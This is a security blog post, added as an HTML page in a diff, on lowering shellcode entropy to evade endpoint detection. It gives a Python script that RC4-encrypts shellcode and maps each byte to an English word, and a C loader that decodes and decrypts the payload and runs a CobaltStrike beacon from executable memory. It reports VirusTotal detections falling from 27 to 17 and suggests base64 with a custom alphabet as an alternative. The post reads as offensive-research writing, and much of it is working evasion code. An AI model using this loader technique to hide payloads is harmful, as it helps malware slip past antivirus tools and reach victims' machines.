@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Riley Kidd - Obfuscating shellcode entropy</title>
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/assets/css/all.css">
+  <link rel="alternate" type="application/atom+xml" title="Riley Kidd" href="https://rileykidd.com/atom.xml" />
+</head>
+<body>
+  <div class="container">
+    <div class="content">
+      <nav>
+  <h2 id="banner"><a href="/">Riley Kidd</a></h2>
+  <div id="social">
+    <div id="stalker">
+  
+  <a title="Twitter" href="https://twitter.com/247CTF">
+    <i class="fa fa-twitter-square"></i>
+  </a>
+  
+  
+  <a title="LinkedIn" href="https://www.linkedin.com/in/rileykidd">
+    <i class="fa fa-linkedin-square"></i>
+  </a>
+  
+  
+  <a title="Send an email" href="mailto:rileykidd@protonmail.com">
+    <i class="fa fa-envelope-square"></i>
+  </a>
+  
+  
+  <a title="Atom feed" id="atom" href="/atom.xml">
+    <i class="fa fa-rss-square"></i>
+  </a>
+  
+</div>
+
+  </div>
+</nav>
+
+      <h1 class="title">Obfuscating shellcode entropy</h1>
+<p class="meta">
+  June 10, 2022
+</p>
+<div id="post">
+  <h2 id="background">Background</h2>
+<p>Some weeks ago, an ex-colleague of mine put together an interesting blogpost outlining ideas and resources to evade Endpoint Detection and Response solutions. The post is not ‘point and shoot’, but it does provide a roadmap and current ‘good practise’ ideas to create a loader which can bypass current technologies.</p>
+
+<p>I recommend you take a look at Vincent’s post for context: <a href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">A blueprint for evading industry leading endpoint protection in 2022</a>.</p>
+
+<p>The closing “It’s a cat and mouse game, and the cat is undoubtedly getting better” comment also demonstrates how much harder you have to work now to bypass security products, compared with the <a href="https://rileykidd.com/2013/06/17/modern-malware-the-game-of-cat-and-mouse/">good old days</a>.</p>
+
+<h2 id="omission">Omission</h2>
+<p>Vincent’s post includes resources and implementations for a few of the proposed steps, but he also included an unimplemented idea in the ‘Reducing entropy’ section:</p>
+
+<blockquote>
+  <p>A more elegant solution would be to design and implement an algorithm that would obfuscate (encode/encrypt) the shellcode into English words (low entropy). That would kill two birds with one stone.</p>
+</blockquote>
+
+<p>Entropy (randomness) can be used as an indicator of ‘badness’ by a security product, as high entropy can indicate that a binary is packed or encrypted - so let’s try to decrease our entropy (higher = more random, lower = less random).</p>
+
+<p>This is an interesting idea, let’s think about a potential solution.</p>
+
+<h2 id="simplistic-solution">Simplistic Solution</h2>
+<p>Shellcode is simply an array of bytes with values ranging from 0x00 to 0xff. Rather than including raw or encrypted shellcode (which may have relatively high entropy), we can instead use the shellcode’s value as an index into some other array, as a type of <a href="https://en.wikipedia.org/wiki/Substitution_cipher">Substituion Cipher</a>.</p>
+
+<p>The other array, could be comprised of anything, but let’s choose English words of the same length, (you’ll see why the same length is useful later) - then rather than including the raw shellcode, we could instead include the sequence of English words based on the original shellcode values index (just like a hashmap).</p>
+
+<p>For example, if we have the following <code class="highlighter-rouge">english_words</code> array and some <code class="highlighter-rouge">shellcode</code> we want to encode:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">english_words</span> <span class="o">=</span> <span class="p">[</span><span class="s">"bank"</span><span class="p">,</span> <span class="s">"base"</span><span class="p">,</span> <span class="s">"bear"</span><span class="p">,</span> <span class="s">"beat"</span><span class="p">]</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00\x01\x02\x03\x02\x01\x00</span><span class="s">"</span>
+</code></pre></div></div>
+
+<p>We could instead rewrite (or encode) our shellcode by performing a substitution based on the English word at the relevant index. In this case, ‘bank’ which is located at index 0 would replace the 0x00th byte, ‘base’ which is located at index 1 would replace the 0x1st byte and so on to create the encoded representation:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"bank base bear beat bear base bank"</span>
+</code></pre></div></div>
+
+<p>Using this substitution approach, we can then use  <code class="highlighter-rouge">bank base bear beat bear base bank</code> as our shellcode, instead of <code class="highlighter-rouge">\x00\x01\x02\x03\x02\x01\x00</code>.</p>
+
+<p>We can also include Vincent’s “Shellcode encryption” step too, with a high-level process:</p>
+<ul>
+  <li>Have an array of 255 words, which are of equal length</li>
+  <li>Randomly shuffle the array of 255 words</li>
+  <li>RC4 encrypt the base shellcode</li>
+  <li>Based on the index - substitute each byte of the RC4 encrypted shellcode, with the corresponding word from the randomly shuffled array</li>
+</ul>
+
+<p>Shellcode execution would follow similar, but differently ordered steps:</p>
+<ul>
+  <li>Based on the word - recreate the encrypted shellcode by substituting each byte with the corresponding index from the randomly shuffled array of 255 words</li>
+  <li>RC4 decrypt the encrypted shellcode</li>
+  <li>???</li>
+  <li>Execute</li>
+</ul>
+
+<h2 id="consistent-word-length">Consistent word length</h2>
+<p>Using an array of words of the same length keeps things simple when we are unencoding the shellcode. We can just jump to the next ‘word length’ offset in the array of words (and then lookup that corresponding index in the 255 word array). In this example I’ve used a word length of 5 (including the null byte). Any length will do, but will increase the resulting file size.</p>
+
+<p>A nicer solution could make use of some offsets, or compression (such as <a href="https://en.wikipedia.org/wiki/Huffman_coding">Huffman coding</a>), but for the purposes of this post (and increasing entropy) - let’s keep it simple.</p>
+
+<h2 id="control-case">Control Case</h2>
+<p>That’s the high-level approach, so let’s start with a control so we can compare results. I’ll create and store to disk a no-frills stageless CobaltStrike beacon shellcode, which is 265728 bytes in length.</p>
+
+<p>We can then include the raw shellcode, allocate executable memory, copy the shellcode into the executable memory and execute inline:</p>
+<pre><code class="language-C">LPVOID mem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (mem) {
+        memcpy(mem, shellcode, shellcode_length);
+        ((void (*)(void))mem)();
+    }
+</code></pre>
+
+<p>Once compiled, we can upload the compiled binary to VirusTotal for some analysis. The <a href="https://www.virustotal.com/gui/file/884e3b1a661d7f4355557a7b61fdb7b7d721e3e595548e58398edd0f2dc37e0e/detection"> results</a> are interesting (concerning?) with only “27 security vendors and 2 sandboxes flag(ing) this file as malicious”. We can also see a number of the products correctly recognise and signature CobaltStrike directly with detections for “Win.Trojan.CobaltStrike-8091534-0” and “Generic.Beacon.B.9B919E05”.</p>
+
+<p>Let’s also take a look at the entropy of the shellcode too using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>:
+<a href="/assets/images/Pasted image 20220607094528.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607094528.png" alt="" /></a></p>
+
+<p>The entropy of our shellcode is quite high with an entropy value of 6.375457812458179. On a scale of 0 to 8, normal English text will typically fall between 3.5 and 5, while encrypted or compressed data will typically have a value of more than 7.5.</p>
+
+<h2 id="test-case">Test Case</h2>
+<p>Now we have our control binary and results, let’s setup our test case. Using Python, we can follow the high-level steps above to encrypt and then encode our CobaltStrike beacon shellcode:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="nn">arc4</span> <span class="kn">import</span> <span class="n">ARC4</span>
+
+<span class="n">ascii_strings</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Ably'</span><span class="p">,</span> <span class="s">'Afar'</span><span class="p">,</span> <span class="s">'Area'</span><span class="p">,</span> <span class="s">'Army'</span><span class="p">,</span> <span class="s">'Away'</span><span class="p">,</span> <span class="s">'Baby'</span><span class="p">,</span> <span class="s">'Back'</span><span class="p">,</span> <span class="s">'Ball'</span><span class="p">,</span> <span class="s">'Band'</span><span class="p">,</span> <span class="s">'Bank'</span><span class="p">,</span> <span class="s">'Base'</span><span class="p">,</span> <span class="s">'Bear'</span><span class="p">,</span> <span class="s">'Beat'</span><span class="p">,</span> <span class="s">'Bill'</span><span class="p">,</span> <span class="s">'Body'</span><span class="p">,</span> <span class="s">'Book'</span><span class="p">,</span> <span class="s">'Burn'</span><span class="p">,</span> <span class="s">'Call'</span><span class="p">,</span> <span class="s">'Card'</span><span class="p">,</span> <span class="s">'Care'</span><span class="p">,</span> <span class="s">'Case'</span><span class="p">,</span> <span class="s">'Cash'</span><span class="p">,</span> <span class="s">'Cast'</span><span class="p">,</span> <span class="s">'City'</span><span class="p">,</span> <span class="s">'Club'</span><span class="p">,</span> <span class="s">'Come'</span><span class="p">,</span> <span class="s">'Cook'</span><span class="p">,</span> <span class="s">'Cope'</span><span class="p">,</span> <span class="s">'Cost'</span><span class="p">,</span> <span class="s">'Damn'</span><span class="p">,</span> <span class="s">'Dare'</span><span class="p">,</span> <span class="s">'Date'</span><span class="p">,</span> <span class="s">'Dead'</span><span class="p">,</span> <span class="s">'Deal'</span><span class="p">,</span> <span class="s">'Deep'</span><span class="p">,</span> <span class="s">'Deny'</span><span class="p">,</span> <span class="s">'Door'</span><span class="p">,</span> <span class="s">'Down'</span><span class="p">,</span> <span class="s">'Draw'</span><span class="p">,</span> <span class="s">'Drop'</span><span class="p">,</span> <span class="s">'Duly'</span><span class="p">,</span> <span class="s">'Duty'</span><span class="p">,</span> <span class="s">'Earn'</span><span class="p">,</span> <span class="s">'East'</span><span class="p">,</span> <span class="s">'Easy'</span><span class="p">,</span> <span class="s">'Edge'</span><span class="p">,</span> <span class="s">'Else'</span><span class="p">,</span> <span class="s">'Even'</span><span class="p">,</span> <span class="s">'Ever'</span><span class="p">,</span> <span class="s">'Face'</span><span class="p">,</span> <span class="s">'Fact'</span><span class="p">,</span> <span class="s">'Fail'</span><span class="p">,</span> <span class="s">'Fair'</span><span class="p">,</span> <span class="s">'Fall'</span><span class="p">,</span> <span class="s">'Farm'</span><span class="p">,</span> <span class="s">'Fast'</span><span class="p">,</span> <span class="s">'Fear'</span><span class="p">,</span> <span class="s">'Feel'</span><span class="p">,</span> <span class="s">'File'</span><span class="p">,</span> <span class="s">'Fill'</span><span class="p">,</span> <span class="s">'Film'</span><span class="p">,</span> <span class="s">'Find'</span><span class="p">,</span> <span class="s">'Fire'</span><span class="p">,</span> <span class="s">'Firm'</span><span class="p">,</span> <span class="s">'Fish'</span><span class="p">,</span> <span class="s">'Flat'</span><span class="p">,</span> <span class="s">'Food'</span><span class="p">,</span> <span class="s">'Foot'</span><span class="p">,</span> <span class="s">'Form'</span><span class="p">,</span> <span class="s">'Full'</span><span class="p">,</span> <span class="s">'Fund'</span><span class="p">,</span> <span class="s">'Gain'</span><span class="p">,</span> <span class="s">'Game'</span><span class="p">,</span> <span class="s">'Girl'</span><span class="p">,</span> <span class="s">'Give'</span><span class="p">,</span> <span class="s">'Goal'</span><span class="p">,</span> <span class="s">'Gold'</span><span class="p">,</span> <span class="s">'Good'</span><span class="p">,</span> <span class="s">'Grow'</span><span class="p">,</span> <span class="s">'Hair'</span><span class="p">,</span> <span class="s">'Half'</span><span class="p">,</span> <span class="s">'Hall'</span><span class="p">,</span> <span class="s">'Hand'</span><span class="p">,</span> <span class="s">'Hang'</span><span class="p">,</span> <span class="s">'Hard'</span><span class="p">,</span> <span class="s">'Hate'</span><span class="p">,</span> <span class="s">'Have'</span><span class="p">,</span> <span class="s">'Head'</span><span class="p">,</span> <span class="s">'Hear'</span><span class="p">,</span> <span class="s">'Help'</span><span class="p">,</span> <span class="s">'Here'</span><span class="p">,</span> <span class="s">'Hide'</span><span class="p">,</span> <span class="s">'High'</span><span class="p">,</span> <span class="s">'Hold'</span><span class="p">,</span> <span class="s">'Home'</span><span class="p">,</span> <span class="s">'Hope'</span><span class="p">,</span> <span class="s">'Hour'</span><span class="p">,</span> <span class="s">'Hurt'</span><span class="p">,</span> <span class="s">'Idea'</span><span class="p">,</span> <span class="s">'Idly'</span><span class="p">,</span> <span class="s">'Jack'</span><span class="p">,</span> <span class="s">'John'</span><span class="p">,</span> <span class="s">'Join'</span><span class="p">,</span> <span class="s">'Jump'</span><span class="p">,</span> <span class="s">'Just'</span><span class="p">,</span> <span class="s">'Keep'</span><span class="p">,</span> <span class="s">'Kill'</span><span class="p">,</span> <span class="s">'Kind'</span><span class="p">,</span> <span class="s">'King'</span><span class="p">,</span> <span class="s">'Know'</span><span class="p">,</span> <span class="s">'Lack'</span><span class="p">,</span> <span class="s">'Lady'</span><span class="p">,</span> <span class="s">'Land'</span><span class="p">,</span> <span class="s">'Last'</span><span class="p">,</span> <span class="s">'Late'</span><span class="p">,</span> <span class="s">'Lead'</span><span class="p">,</span> <span class="s">'Lend'</span><span class="p">,</span> <span class="s">'Life'</span><span class="p">,</span> <span class="s">'Lift'</span><span class="p">,</span> <span class="s">'Like'</span><span class="p">,</span> <span class="s">'Line'</span><span class="p">,</span> <span class="s">'Link'</span><span class="p">,</span> <span class="s">'List'</span><span class="p">,</span> <span class="s">'Live'</span><span class="p">,</span> <span class="s">'Long'</span><span class="p">,</span> <span class="s">'Look'</span><span class="p">,</span> <span class="s">'Lord'</span><span class="p">,</span> <span class="s">'Lose'</span><span class="p">,</span> <span class="s">'Loss'</span><span class="p">,</span> <span class="s">'Loud'</span><span class="p">,</span> <span class="s">'Love'</span><span class="p">,</span> <span class="s">'Make'</span><span class="p">,</span> <span class="s">'Mark'</span><span class="p">,</span> <span class="s">'Mary'</span><span class="p">,</span> <span class="s">'Meet'</span><span class="p">,</span> <span class="s">'Mind'</span><span class="p">,</span> <span class="s">'Miss'</span><span class="p">,</span> <span class="s">'Move'</span><span class="p">,</span> <span class="s">'Much'</span><span class="p">,</span> <span class="s">'Must'</span><span class="p">,</span> <span class="s">'Name'</span><span class="p">,</span> <span class="s">'Near'</span><span class="p">,</span> <span class="s">'Need'</span><span class="p">,</span> <span class="s">'News'</span><span class="p">,</span> <span class="s">'Nice'</span><span class="p">,</span> <span class="s">'Note'</span><span class="p">,</span> <span class="s">'Okay'</span><span class="p">,</span> <span class="s">'Once'</span><span class="p">,</span> <span class="s">'Only'</span><span class="p">,</span> <span class="s">'Open'</span><span class="p">,</span> <span class="s">'Over'</span><span class="p">,</span> <span class="s">'Page'</span><span class="p">,</span> <span class="s">'Pain'</span><span class="p">,</span> <span class="s">'Pair'</span><span class="p">,</span> <span class="s">'Park'</span><span class="p">,</span> <span class="s">'Part'</span><span class="p">,</span> <span class="s">'Pass'</span><span class="p">,</span> <span class="s">'Past'</span><span class="p">,</span> <span class="s">'Path'</span><span class="p">,</span> <span class="s">'Paul'</span><span class="p">,</span> <span class="s">'Pick'</span><span class="p">,</span> <span class="s">'Plan'</span><span class="p">,</span> <span class="s">'Play'</span><span class="p">,</span> <span class="s">'Post'</span><span class="p">,</span> <span class="s">'Pray'</span><span class="p">,</span> <span class="s">'Pull'</span><span class="p">,</span> <span class="s">'Push'</span><span class="p">,</span> <span class="s">'Rain'</span><span class="p">,</span> <span class="s">'Rate'</span><span class="p">,</span> <span class="s">'Read'</span><span class="p">,</span> <span class="s">'Real'</span><span class="p">,</span> <span class="s">'Rely'</span><span class="p">,</span> <span class="s">'Rest'</span><span class="p">,</span> <span class="s">'Ride'</span><span class="p">,</span> <span class="s">'Ring'</span><span class="p">,</span> <span class="s">'Rise'</span><span class="p">,</span> <span class="s">'Risk'</span><span class="p">,</span> <span class="s">'Road'</span><span class="p">,</span> <span class="s">'Rock'</span><span class="p">,</span> <span class="s">'Role'</span><span class="p">,</span> <span class="s">'Roll'</span><span class="p">,</span> <span class="s">'Room'</span><span class="p">,</span> <span class="s">'Rule'</span><span class="p">,</span> <span class="s">'Sale'</span><span class="p">,</span> <span class="s">'Save'</span><span class="p">,</span> <span class="s">'Seat'</span><span class="p">,</span> <span class="s">'Seek'</span><span class="p">,</span> <span class="s">'Seem'</span><span class="p">,</span> <span class="s">'Sell'</span><span class="p">,</span> <span class="s">'Send'</span><span class="p">,</span> <span class="s">'Shed'</span><span class="p">,</span> <span class="s">'Shop'</span><span class="p">,</span> <span class="s">'Show'</span><span class="p">,</span> <span class="s">'Shut'</span><span class="p">,</span> <span class="s">'Side'</span><span class="p">,</span> <span class="s">'Sign'</span><span class="p">,</span> <span class="s">'Sing'</span><span class="p">,</span> <span class="s">'Site'</span><span class="p">,</span> <span class="s">'Size'</span><span class="p">,</span> <span class="s">'Skin'</span><span class="p">,</span> <span class="s">'Slip'</span><span class="p">,</span> <span class="s">'Slow'</span><span class="p">,</span> <span class="s">'Solo'</span><span class="p">,</span> <span class="s">'Soon'</span><span class="p">,</span> <span class="s">'Sort'</span><span class="p">,</span> <span class="s">'Star'</span><span class="p">,</span> <span class="s">'Stay'</span><span class="p">,</span> <span class="s">'Step'</span><span class="p">,</span> <span class="s">'Stop'</span><span class="p">,</span> <span class="s">'Suit'</span><span class="p">,</span> <span class="s">'Sure'</span><span class="p">,</span> <span class="s">'Take'</span><span class="p">,</span> <span class="s">'Talk'</span><span class="p">,</span> <span class="s">'Task'</span><span class="p">,</span> <span class="s">'Team'</span><span class="p">,</span> <span class="s">'Tell'</span><span class="p">,</span> <span class="s">'Tend'</span><span class="p">,</span> <span class="s">'Term'</span><span class="p">,</span> <span class="s">'Test'</span><span class="p">,</span> <span class="s">'Text'</span><span class="p">,</span> <span class="s">'That'</span><span class="p">,</span> <span class="s">'Then'</span><span class="p">,</span> <span class="s">'This'</span><span class="p">,</span> <span class="s">'Thus'</span><span class="p">,</span> <span class="s">'Time'</span><span class="p">,</span> <span class="s">'Tour'</span><span class="p">,</span> <span class="s">'Town'</span><span class="p">,</span> <span class="s">'Tree'</span><span class="p">,</span> <span class="s">'Turn'</span><span class="p">,</span> <span class="s">'Type'</span><span class="p">,</span> <span class="s">'Unit'</span><span class="p">,</span> <span class="s">'User'</span><span class="p">,</span> <span class="s">'Vary'</span><span class="p">,</span> <span class="s">'Very'</span><span class="p">,</span> <span class="s">'View'</span><span class="p">,</span> <span class="s">'Vote'</span><span class="p">,</span> <span class="s">'Wait'</span><span class="p">,</span> <span class="s">'Wake'</span><span class="p">,</span> <span class="s">'Walk'</span><span class="p">,</span> <span class="s">'Wall'</span><span class="p">,</span> <span class="s">'Want'</span><span class="p">,</span> <span class="s">'Warn'</span><span class="p">,</span> <span class="s">'Wash'</span><span class="p">,</span> <span class="s">'Wear'</span><span class="p">,</span> <span class="s">'Week'</span><span class="p">,</span> <span class="s">'When'</span><span class="p">,</span> <span class="s">'Wide'</span><span class="p">,</span> <span class="s">'Wife'</span><span class="p">,</span> <span class="s">'Will'</span><span class="p">,</span> <span class="s">'Wind'</span><span class="p">,</span> <span class="s">'Wine'</span><span class="p">,</span> <span class="s">'Wish'</span><span class="p">,</span> <span class="s">'Wood'</span><span class="p">,</span> <span class="s">'Word'</span><span class="p">,</span> <span class="s">'Work'</span><span class="p">,</span> <span class="s">'Year'</span><span class="p">]</span>
+<span class="n">random</span><span class="p">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">ascii_strings</span><span class="p">)</span>
+
+<span class="n">output_file</span> <span class="o">=</span> <span class="s">"shellcode.h"</span>
+<span class="n">raw</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">arc4</span> <span class="o">=</span> <span class="n">ARC4</span><span class="p">(</span><span class="s">"vinny"</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">arc4</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">ascii_strings</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">])</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">fh</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'''const char* strings[] = {{ </span><span class="se">\"</span><span class="s">{}</span><span class="se">\"</span><span class="s"> }};
+const int length = {};
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span>
+        <span class="s">"</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ascii_strings</span><span class="p">]),</span>
+        <span class="nb">len</span><span class="p">(</span><span class="n">raw</span><span class="p">),</span>
+        <span class="s">', 0x'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">encoded</span><span class="p">),</span>
+    <span class="p">))</span>
+</code></pre></div></div>
+
+<p>Now we have the shellcode in an encoded format, we can unencode, unencrypt and inline execute it again (in a similar way to our control):</p>
+<pre><code class="language-C">int get_index(char * find) {
+    int index = 0;
+    for (int i = 0; i &lt; sizeof(strings) / sizeof(strings[0]); i++) {
+        if (strcmp(find, strings[i]) == 0) {
+            return index;
+        }
+        index++;
+    }
+    return -1;
+}
+
+int main() {
+    int string_length = 5;
+    unsigned char* ciphertext = (unsigned char*)malloc(length);
+    unsigned char* plaintext = (unsigned char*)malloc(length);
+    LPVOID mem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (ciphertext &amp;&amp; plaintext &amp;&amp; mem){
+        for (int i = 0; i &lt; length; i++) {
+            *(ciphertext + i) = get_index((char*)(encoded + (i * string_length)));
+        }
+
+        RC4_init("vinny");
+        RC4_decrypt(ciphertext, plaintext, length);
+        memcpy(mem, plaintext, length);
+        ((void (*)(void))mem)();
+
+        free(ciphertext);
+        free(plaintext);
+    }
+    return 0;
+}
+</code></pre>
+
+<p>We can again upload the resulting binary to <a href="https://www.virustotal.com/gui/file/4da437ccf9b333d57c62fb66f24cd6d0c7c39da44f602163fd537a776684e8b0/details">VirusTotal</a> and compare. The results are similarly concerning, with “17 security vendors and 1 sandbox flagg(ing) this file as malicious”. The detections are now also more generic with labels of “Unsafe” or “Malicious”. Which makes sense - the CobaltStrike beacon signature is no longer evident in the file.</p>
+
+<p>If we take a look at the entropy of our new shellcode:
+<a href="/assets/images/Pasted image 20220607100132.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607100132.png" alt="" /></a></p>
+
+<p>We can see that with the substitution, the new entropy of 4.616721721844255 is much more representative of standard English text, and no longer appears to be encrypted or compressed data.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>So we have created 2 versions of our binary which executes an inline CobaltStrike payload. The raw control version was detected by 27 vendors, while the encrypted and encoded version with lower entropy shellcode was detected by 17 vendors (in retrospect, the raw version should have been encrypted too as a better control.. but we are already in the conclusion so it’s too late to change that now..).</p>
+
+<p>It’s difficult to make a concrete interpretation of the results due to the number of potential data points, but it’s fair to assume that at least 10 vendors may be using entropy (or known shellcode signatures) as some indicator of binary ‘maliciousness’. With the same inline execution process and final shellcode behaviour, 10 fewer vendors identified the lower entropy shellcode as suspicious - even though the end execution result (of a CobaltStrike beacon) was the same.</p>
+
+<p>Will lower entropy (and encryption) make your loader fully undetectable?</p>
+
+<p>No.</p>
+
+<p>But it won’t make it worse either.</p>
+
+<h2 id="side-note">Side note</h2>
+<p>Oh, and if you’re just looking for close enough - base64 encoding high entropy shellcode will give a similar result due to the way base64 encoding works (and if you’re worried about automated analysis of base64 encoded blobs, you could use a custom character set too):</p>
+
+<p><a href="/assets/images/Pasted image 20220607101000.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607101000.png" alt="" /></a></p>
+
+</div>
+<div id="related">
+  <h3>Recent Posts</h3>
+  <ul id="blog-posts" class="posts">
+    
+    <li>
+      <span>21 Jun 2022</span> <a href="/2022/06/21/shared-section-code-execution/">Shared section code execution</a>
+    </li>
+    
+    <li>
+      <span>08 Jul 2018</span> <a href="/2018/07/08/solving-CTF-challenges-with-DLL-injection/">Solving CTF challenges with DLL injection</a>
+    </li>
+    
+    <li>
+      <span>17 Oct 2017</span> <a href="/2017/10/17/a-watering-hole-with-Windows-binaries/">A watering hole with Windows binaries</a>
+    </li>
+    
+  </ul>
+</div>
+
+      <div class="footer">
+        <div class="disclaimer">
+  
+  <p>
+    The postings on this site are my own and don't represent my employer
+  </p>
+  
+</div>
+
+      </div>
+    </div>
+  </div>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox-plus-jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<!--
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-41399516-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+-->
+</body>
+</html>
